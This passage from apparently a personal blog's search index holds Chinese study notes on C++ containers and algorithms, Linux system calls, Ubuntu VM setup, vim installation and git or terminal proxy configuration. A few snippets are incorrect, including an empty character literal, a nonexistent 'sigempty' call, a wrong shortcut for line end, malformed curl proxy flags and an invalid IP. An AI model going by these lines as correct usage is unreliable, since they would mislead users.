"Hello, world!"; string sub = s.substr(0, s.find_last_of('')); // sub 的值为 "Hello," <pre class="language-none"><code class="language-none">    - vector-erase  - 示例     &#96;&#96;&#96;cpp    &#x2F;&#x2F; 多个相同值只删除一个    auto it &#x3D; std::find(vec.begin(), vec.end(), val);    if (it !&#x3D; vec.end()) &#123;        vec.erase(it);    &#125;        &#x2F;&#x2F; -----------------------------------    #include &lt;algorithm&gt;    #include &lt;vector&gt;        int main() &#123;        std::vector&lt;int&gt; vec&#123;1, 2, 3, 4, 5, 6&#125;;        int val &#x3D; 3;        vec.erase(std::remove(vec.begin(), vec.end(), val), vec.end());        &#x2F;&#x2F; 此时 vec 中的元素为 &#123;1, 2, 4, 5, 6&#125;    &#125;</code></pre></p></li></ul></li><li><p>vector :end()</p></li><li><p>2 维vector</p><ul><li><p>code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> v<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> v<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// </span></code></pre></li></ul></li></ul><ol type="1"><li><p>set <u>vs</u> map ：哈希表操作复杂度O(1),</p><blockquote><ul><li>共同特点：有序，键唯一</li><li>不同点:存储的值不一样，<code>set：(key)</code>，<code>map:(key,value)</code></li><li><code>unordered_</code>: 无序</li><li><code>multi_</code>: 允许重复</li></ul></blockquote><ul><li><code>count()</code>方法</li><li><code>lower_bound(val)</code>: 大于等于，返回迭代器</li></ul></li><li><p>输入输出练习</p><p><a href="https://ac.nowcoder.com/acm/contest/5657">牛客在线训练</a><ahref="https://chen-tianyi.com/archives/oj%E5%9C%A8%E7%BA%BF%E7%BC%96%E7%A8%8B%E5%B8%B8%E8%A7%81%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA">牛客答案</a></p><blockquote><ul><li><code>cin</code>:遇到空格终止</li><li>遇到回车终止：<ul><li><code>cin.getline(str,20)</code>: 操作 <code>char</code>数组</li><li><code>getline(cin,s)</code>:操作 <code>string</code></li></ul></li><li>判断一行的结尾：<code>cin.get() =='\n'</code></li><li><code>cin</code>:滤过不可见字符</li><li><code>stringstream()</code>：字符串转换为整型</li></ul></blockquote><pre class="language-cpp" data-language="cpp"><code class="language-cpp">string s <span class="token operator">=</span> <span class="token string">"12345"</span><span class="token punctuation">;</span>stringstream <span class="token function">geek</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  </code></pre><ul><li><code>vector</code>初始化</li><li><code>vector&lt;int&gt;(26,0)</code></li><li><code>to_string()</code></li><li><code>string</code>加法</li></ul></li><li><p><code>lambda</code>表达式</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">      <span class="token comment">// 字符串常量默认类型char*</span><span class="token keyword">auto</span> isVowel <span class="token operator">=</span> <span class="token punctuation">[</span>vowels <span class="token operator">=</span> <span class="token string">"aeiouAEIOU"</span>s<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">char</span> ch<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// string literals</span>      find函数在找不到指定值得情况下会返回string<span class="token double-colon punctuation">::</span>npos          <span class="token keyword">return</span> vowels<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">!=</span> string<span class="token double-colon punctuation">::</span>npos<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token comment">// 用法</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> n <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isVowel</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>abs()</code></p></li><li><p><code>cur = (cur &lt;&lt; 1) + root-&gt;val</code>：必须加括号</p></li><li><p>条件非还是不非</p></li></ol><h3 id="ds">DS</h3><hr /><h4 id="必要的思想">必要的思想</h4><ol type="1"><li>降低时间复杂度的一个绝招就是增加空间复杂度：<strong>利用更好的数据结构</strong>。</li><li>尽量先想好边界。</li><li>考虑递归出口</li></ol><h4 id="有用的代码">有用的代码</h4><ol type="1"><li>字符串</li></ol><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">bool</span> <span class="token function">isAnagram</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> string t<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 哈希表  键与值</span>        <span class="token comment">// 一次insert,一次对比</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> t<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">v</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">char</span> c <span class="token operator">:</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            v<span class="token punctuation">[</span>c <span class="token operator">-</span> <span class="token char">'a'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">char</span> c <span class="token operator">:</span> t<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            v<span class="token punctuation">[</span>c <span class="token operator">-</span> <span class="token char">'a'</span><span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span>c <span class="token operator">-</span> <span class="token char">'a'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><ol start="2" type="1"><li></li></ol><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> c <span class="token operator">=</span> <span class="token char">'2'</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"c - '0' = "</span> <span class="token operator">&lt;&lt;</span> c <span class="token operator">-</span> <span class="token char">'0'</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token comment">// 结果：int值2</span></code></pre><h4 id="位运算技巧">位运算技巧</h4><ol type="1"><li>移位运算更快</li><li><ahref="https://leetcode-cn.com/problems/contains-duplicate-iii/">220.存在重复元素 III</a></li></ol><blockquote><p>异或运算：<code>a^a = 0,a ^ 0 = a</code></p></blockquote><ol start="3" type="1"><li>字符异或：<code>char</code>与 <code>int</code>之间隐式转换</li></ol><h4 id="投票算法寻找众数">投票算法寻找众数</h4><ul><li><a href="https://leetcode-cn.com/problems/majority-element/">169.多数元素</a></li></ul><h4 id="双指针法">双指针法</h4><ol type="1"><li>同时遍历两个对象</li></ol><h4 id="有序">有序</h4><ol type="1"><li>二分法</li><li><code>BST</code> :中序遍历为有序</li></ol><h4 id="桶排序暂留">桶排序（暂留）</h4><p><ahref="https://leetcode-cn.com/problems/contains-duplicate-iii">220.存在重复元素 III</a></p><h4 id="递归">递归</h4><ol type="1"><li>注意递归出口</li><li>链表、树</li></ol><h4 id="排序">排序</h4><ol type="1"><li><code>quickSort()</code></li></ol><blockquote><ul><li>选定一个枢轴，以该枢轴划分成剩余的两个子序列，继续划分</li></ul></blockquote><h4 id="随机数">随机数</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctime></span> </span><span class="token keyword">int</span> pos <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> left<span class="token punctuation">;</span>   <span class="token comment">// [left,right]</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// 使用当前时钟作为随机数种子 </span></code></pre><h4 id="kmp算法暂留">KMP算法（暂留）</h4><h4 id="if-else条件选择">if-else条件选择</h4><ul><li>事先想好所有的情况</li><li><code>while</code>和 <code>if</code>括号里的条件选择<strong>条件可能是对立的</strong></li></ul><h4 id="集合中的双射">集合中的双射</h4><h4 id="循环">循环</h4><ol type="1"><li>循环退出条件（遍历范围）</li><li>遍历指针++</li></ol><h4 id="整数与字符之间的转换">整数与字符之间的转换</h4><ol type="1"><li><code>to_string()</code></li><li>做差： <code>'1' -'0'</code></li></ol><h4 id="规律观察">规律观察</h4><ol type="1"><li>奇数、偶数规律</li></ol><h4 id="栈的应用">栈的应用</h4><ol type="1"><li>括号配对</li></ol><h4 id="树">树</h4><ol type="1"><li>立刻想到递归</li><li>注意递归层次</li><li>确定递归需要完成的任务</li><li>遍历方式</li></ol><h4 id="检查笔误">检查笔误</h4><h4 id="链表">链表</h4><ol type="1"><li>添加头结点的好处</li><li><a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/">24.两两交换链表中的节点</a></li></ol><h4 id="注释">注释</h4><ol type="1"><li>先写注释，再将注释分开</li></ol><h4 id="细节小计算">细节，小计算</h4><h4 id="冒泡排序的优化">冒泡排序的优化</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//  价格逆序（稳定性）:冒泡排序</span><span class="token keyword">void</span> <span class="token function">priceSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>book<span class="token operator">></span><span class="token operator">&amp;</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> v<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>price <span class="token operator">&lt;</span> v<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>price<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">swap</span><span class="token punctuation">(</span>v<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> v<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="红黑树">红黑树</h4>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Data Structure </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux系统编程</title>
      <link href="/2022/01/31/linux-xi-tong-bian-cheng/"/>
      <url>/2022/01/31/linux-xi-tong-bian-cheng/</url>
      
        <content type="html"><![CDATA[<h3 id="makefile">makefile</h3><ul><li>一些概念</li></ul><blockquote><p><code>$@</code>:目标文件，<code>$^</code>:所有的依赖文件，<code>$&lt;</code>:第一个依赖文件<code>AR = ar rc</code> : 生成静态库文件命令 <code>-fPIC</code>作用于编译阶段，告诉编译器产生与位置无关代码(<em>Position-IndependentCode</em>)</p></blockquote><ul><li>自制sharedLibrary</li></ul><blockquote><p>导入环境变量：<ahref="https://unix.stackexchange.com/questions/25218/error-while-loading-shared-libraries">refference</a></p></blockquote><ul><li>temporary:<code>export LD_LIBRARY_PATH="$PROJ/lib/3rdpartylib/:$LD_LIBRARY_PATH"</code><ul><li>new configFile</li></ul></li></ul><h3 id="api">API</h3><ul><li><p>open()</p></li><li><p>read()</p></li><li><p>write()</p></li><li><p>lseek()</p></li><li><p>ftruncate()</p></li></ul><blockquote><p>需要写权限</p></blockquote><ul><li><p>dup()</p></li><li><p>dup2()</p></li><li><p>wait()</p></li><li><p>waitpid()</p></li><li><p>int execlp(const char <em>file, const char</em>arg, …)</p></li><li><p>int execl(const char <em>path, const char</em>arg, …)</p></li><li><p>fork()</p></li></ul><h3 id="通信">通信</h3><ul><li><p>pipe()：匿名管道</p></li><li><p>FIFO：有名管道</p></li><li><p>mmap()</p></li></ul><blockquote><p>先pipe后fork():创建子进程，并在管道上与父进程有相同的实现。</p></blockquote><ul><li>ummap</li></ul><blockquote><p>父子进程：<strong>全局变量</strong>：读时共享，写时复制</p></blockquote><ul><li>特殊文件</li></ul><blockquote><p>/dev/zero /dev/null</p></blockquote><ul><li>alarm函数</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> <span class="token number">1630</span></code></pre><blockquote><p>实现<code>ls|wc -l</code></p></blockquote><h3 id="信号">信号</h3><ul><li>段错误：非法访问内存</li></ul><pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">sigset_t</span> set<span class="token punctuation">;</span><span class="token function">sigempty</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sigaddset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>set<span class="token punctuation">,</span>SIGINT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span><span class="token operator">&amp;</span>set<span class="token punctuation">,</span><span class="token operator">&amp;</span>oldset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sigpending</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>myset<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li><p>signal()</p></li><li><p>sigaction()</p></li></ul><h3 id="会话">会话</h3><ul><li><p>setsid()</p></li><li><p>chdir()</p></li></ul><h3 id="线程">线程</h3><ul><li>编译加 -lpthread</li><li>pthread_t pthread_self();</li><li>int pthread_create();</li><li>exit(0); // 退出进程</li><li>pthread_exit();</li><li>pthread_join();</li><li>pthread_cancel();</li><li>pthread_testcancel();</li><li>pthread_detach();</li><li>fprintf(stderr,"xxx error %s",stderror());</li></ul><h3 id="命令">命令</h3><ul><li><p>ps ajx</p></li><li><p>ulimit -a</p></li><li><p>kill -l</p></li><li><p>ps ajx</p></li><li><p>time ./alarm</p></li><li><p>cat|cat|cat|wc -l</p></li><li><p>ps -Lf 进程id</p></li></ul><hr /><p><strong>2021-02-20结束</strong></p>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/2022/01/24/linux/"/>
      <url>/2022/01/24/linux/</url>
      
        <content type="html"><![CDATA[<p><strong>NOTICE</strong>!</p><h3id="环境基础vmware下的-ubuntu-18.04.6-lts系统环境中">环境基础：vmware下的Ubuntu 18.04.6 LTS系统环境中</h3><ul><li>安装<em>vmware workStation Pro</em>最新版</li><li>制作iso映像文件，创建虚拟机</li><li>install vmware-tools</li><li>开启宿主机与客户机共享文件夹</li></ul><h3 id="更换下载源-提高下载速度">更换下载源 提高下载速度</h3><blockquote><ol type="1"><li><code>sudo gedit /etc/apt/sources.list</code></li><li>将以下源复制到文件中</li></ol></blockquote><pre class="language-none"><code class="language-none">#中科大源deb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiversedeb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic main restricted universe multiversedeb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiversedeb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiversedeb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiversedeb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiversedeb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiversedeb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiversedeb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiversedeb-src https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiverse</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> build-essential</code></pre><h2 id="共享文件夹">共享文件夹</h2><blockquote><p>文件夹下为空？solution below</p></blockquote><ul><li><p>手动挂载 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> fuse.vmhgfs-fuse .host:/ /mnt/hgfs <span class="token parameter variable">-o</span> allow_other</code></pre></p></li><li><p>自动挂载 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span><span class="token function">vi</span> /etc/fstab// 注意前面加 **点**.host:/ /mnt/hgfs fuse.vmhgfs-fuse allow_other,defaults <span class="token number">0</span> <span class="token number">0</span></code></pre> ## vim</p></li><li><p>最新版本vim8.2安装</p></li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span><span class="token function">git</span> clone https://github.com/vim/vim.git<span class="token builtin class-name">cd</span> vim./configure<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ncurses-dev<span class="token function">sudo</span> yum <span class="token function">install</span> ncurses-devel<span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span></code></pre><ul><li><p>命令：<code>vimtutor</code>,进入教程</p></li><li><p>vimrc： 美化vim &gt; 全局vimrc 与 个人vimrc</p></li></ul><blockquote><p>安装了<strong>vim</strong>之后，<strong>vimrc</strong>文件应该会生成在_/home/ _用户名_处，且需要使用<code>ls -a</code>才能显示</p></blockquote><blockquote><p>个人vimrc： <code>sudo vi ~/.vimrc</code></p></blockquote><blockquote><p><strong>指定范围替换</strong>：:`:6,18s/gcc/$(CC)/</p></blockquote><h2 id="linux命令">linux命令</h2><blockquote><p>训练网站：<ahref="https://www.lanqiao.cn/courses/68/learning/?id=393"class="uri">https://www.lanqiao.cn/courses/68/learning/?id=393</a></p></blockquote><blockquote><p>获得<code>root</code>权限跟<code>sudo+操作</code>不一样,可进入<strong>系统文件目录</strong></p></blockquote><blockquote><p>root-&gt;普通用户:<code>exit</code></p></blockquote><blockquote><p>重命名：<code>mv abc 1234</code></p></blockquote><ul><li>下载net-tools</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> net-tools</code></pre><blockquote><ol start="2" type="1"><li>输入i<strong>f</strong>config</li></ol></blockquote><ul><li>光标移动</li></ul><blockquote><p>行首：<strong>ctrl + a</strong> 行尾：<strong>ctrl + b</strong></p></blockquote><h2 id="xshell-远程连接虚拟机">xshell 远程连接虚拟机</h2><ul><li>linux中要先有ssh服务</li></ul><h2 id="科学上网-终端设置代理">科学上网 终端设置代理</h2><ol type="1"><li><code>clash-for-windows</code>在kali中的使用</li></ol><blockquote><ol type="1"><li>ssr订阅转换成clash</li><li>profiles <code>--&gt;</code> download</li></ol></blockquote><figure><img src="https://s2.loli.net/2022/07/08/641E5mVZqWkN3XD.png"alt="image-20220708172945419" /><figcaption aria-hidden="true">image-20220708172945419</figcaption></figure><blockquote><ol start="3" type="1"><li>默认端口7890</li><li>系统设置中 <code>-&gt;</code>network proxy</li></ol></blockquote><figure><img src="https://s2.loli.net/2022/07/08/fCqbHj7EQPMpdAW.png"alt="image-20220708173152075" /><figcaption aria-hidden="true">image-20220708173152075</figcaption></figure><blockquote><p>虚拟机网络编辑器-&gt;还原默认设置-&gt;重启虚拟机：<strong>虚拟机IP地址会发生变化</strong></p></blockquote><ul><li><p><strong>注意端口的对应</strong>:http:12333；socks:1080</p></li><li><p>github 下载-ssr-安装包，deb格式，参考github官方文档安装</p></li><li><p>解决 <em>git clone 时 Failed to connect to github com port 443连接超时</em>问题,这个问题均与代理相关 &gt; <strong>设置代理</strong>：以 <strong>git-bash</strong>为例：</p></li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">// 查看是否使用代理<span class="token function">env</span><span class="token operator">|</span><span class="token function">grep</span> <span class="token parameter variable">-I</span> proxy//http<span class="token function">git</span> config <span class="token parameter variable">--global</span> http.proxy http://127.0.0.1:12333<span class="token function">git</span> config <span class="token parameter variable">--global</span> http.proxy socks5://127.0.0.1:1080//https<span class="token function">git</span> config <span class="token parameter variable">--global</span> https.proxy https://127.0.0.1:12333<span class="token function">git</span> config <span class="token parameter variable">--global</span> https.proxy socks5://127.0.0.1:1080// 取消代理<span class="token function">git</span> config <span class="token parameter variable">--global</span> <span class="token parameter variable">--unset</span> http.proxy// ubuntu terminal  <span class="token builtin class-name">export</span> <span class="token assign-left variable">http_proxy</span><span class="token operator">=</span><span class="token string">"socks5://127.0.0.1:1080"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">https_proxy</span><span class="token operator">=</span><span class="token string">"socks5://127.0.0.1:1080"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">http_proxy</span><span class="token operator">=</span><span class="token string">"http://127.0.0.1:12333"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">https_proxy</span><span class="token operator">=</span><span class="token string">"http://127.0.0.1:12333"</span><span class="token function">curl</span> <span class="token parameter variable">-x</span> <span class="token parameter variable">--proxy</span> <span class="token number">127.0</span>.0.1:12333 <span class="token parameter variable">-l</span> http://aiezu.com/test.php<span class="token function">curl</span> <span class="token parameter variable">-x</span> <span class="token parameter variable">--socks5</span> <span class="token number">127.0</span>.0.0.1:1080 <span class="token parameter variable">-l</span> http://aiezu.com/test.php</code></pre><blockquote><p>也可以直接修改用户主目录下的 .gitconfig 文件 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>http<span class="token punctuation">]</span>        proxy <span class="token operator">=</span> socks5://127.0.0.1:1080<span class="token punctuation">[</span>https<span class="token punctuation">]</span>        proxy <span class="token operator">=</span> socks5://127.0.0.1:1080</code></pre></p></blockquote><blockquote><p>一个工具（可选）：proxychains</p></blockquote><blockquote><p>检查是否使用了代理：curl cip.cc</p></blockquote><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208192140799.png"alt="image-20220819214026754" /><figcaption aria-hidden="true">image-20220819214026754</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208192131499.png"alt="image-20220819213132418" /><figcaption aria-hidden="true">image-20220819213132418</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208192135162.png"alt="image-20220819213501105" /><figcaption aria-hidden="true">image-20220819213501105</figcaption></figure><h2 id="vmware-ubuntu系统-相关">vmware &amp;&amp; ubuntu系统 相关</h2><ul><li>一次系统升级失败后的忏悔</li></ul><blockquote><p>系统备份，虚拟机中使用快照功能</p></blockquote><blockquote><p>vmware中点击 <em>重置</em>， 进入 <em>GNU GRUB</em>，<ahref="https://www.howtogeek.com/196740/how-to-fix-an-ubuntu-system-when-it-wont-boot/"class="uri">https://www.howtogeek.com/196740/how-to-fix-an-ubuntu-system-when-it-wont-boot/</a></p></blockquote><ul><li>备份vscoode "setting.json" 和 vim "vimrc"</li></ul><blockquote><p><ahref="https://github.com/liuhaihuaAACC/configCollect.git">github</a></p></blockquote><figure><imgsrc="C:/Users/liu%20haihua/AppData/Roaming/Typora/typora-user-images/image-20220819202619249.png"alt="image-20220819202619249" /><figcaption aria-hidden="true">image-20220819202619249</figcaption></figure><figure><imgsrc="C:/Users/liu%20haihua/AppData/Roaming/Typora/typora-user-images/image-20220819202632733.png"alt="image-20220819202632733" /><figcaption aria-hidden="true">image-20220819202632733</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208192029863.png"alt="image-20220819202900794" /><figcaption aria-hidden="true">image-20220819202900794</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>article collection</title>
      <link href="/2022/01/18/article-collection/"/>
      <url>/2022/01/18/article-collection/</url>
      
        <content type="html"><![CDATA[<h3 id="web安全">Web安全</h3><ol type="1"><li><a href="https://blog.csdn.net/weixin_47598409?type=blog">csdn晚安</a></li><li><ahref="https://ctf101.org/web-exploitation/overview/">CTF101</a></li><li><ahref="https://developer.aliyun.com/profile/expert/lnsgf6zjgh42u">士别三日wyx</a></li></ol><h3 id="对抗样本">对抗样本</h3><ol type="1"><li><ahref="https://zhuanlan.zhihu.com/p/585456510">对抗鲁棒性学习资料汇总</a></li></ol><h3 id="恶意代码">恶意代码</h3><h3 id="web开发">Web开发</h3><ol type="1"><li><ahref="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">web开发技术</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Resource </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>STL基础</title>
      <link href="/2022/01/11/stl/"/>
      <url>/2022/01/11/stl/</url>
      
        <content type="html"><![CDATA[<h2 id="dequeue容器">dequeue容器</h2>]]></content>
      
      
      <categories>
          
          <category> Programming Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++提高</title>
      <link href="/2022/01/08/c-ti-gao/"/>
      <url>/2022/01/08/c-ti-gao/</url>
      
